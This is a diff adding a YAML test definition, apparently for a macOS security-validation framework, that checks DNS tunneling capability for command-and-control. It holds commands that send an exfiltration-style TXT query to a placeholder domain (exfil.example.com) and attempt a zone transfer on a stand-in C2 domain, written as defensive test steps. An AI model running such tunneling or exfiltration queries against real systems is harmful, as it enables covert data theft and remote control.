@@ -1,0 +1,62 @@
+api_version: 2.0
+id: 002-dns-tunneling-capability
+name: DNS Tunneling Capability Check
+description: Detects DNS tunneling capabilities used for C2 communication
+type: command_and_control
+
+requirements:
+  platforms:
+    - os: darwin
+
+args:
+  - name: c2_domain
+    type: string
+    description: C2 domain for DNS tunneling
+    default: c2.example.com
+  - name: test_payload
+    type: string
+    description: Encoded payload to tunnel via DNS
+    default: "test1234.exfil.example.com"
+  - name: dns_server
+    type: string
+    description: DNS server to query
+    default: 8.8.8.8
+
+steps:
+  - name: prepare_dns_tunnel_query
+    description: Prepare DNS query for tunneling
+    command: echo "Preparing DNS tunnel query for {{ test_payload }}"
+    type: command
+  
+  - name: dns_query_attempt
+    description: Attempt DNS query with encoded payload
+    command: dig @{{ dns_server }} {{ test_payload }} TXT +short
+    type: command
+  
+  - name: zone_transfer_attempt
+    description: Attempt zone transfer on C2 domain
+    command: dig @{{ dns_server }} {{ c2_domain }} AXFR
+    type: command
+    cleanup: true
+
+checks:
+  - name: verify_tunnel_response
+    description: Verify DNS tunnel response received
+    condition: |
+      Response should contain encoded data or DNS records
+    type: output_validation
+
+test_type: dry_run
+
+cleanup:
+  - name: flush_dns_cache
+    description: Clear DNS cache
+    command: sudo dscacheutil -flushcache
+    type: command
+    optional: true
+
+metadata:
+  created: 2026-01-30
+  author: Claude Code
+  severity: medium
+  category: network_communication
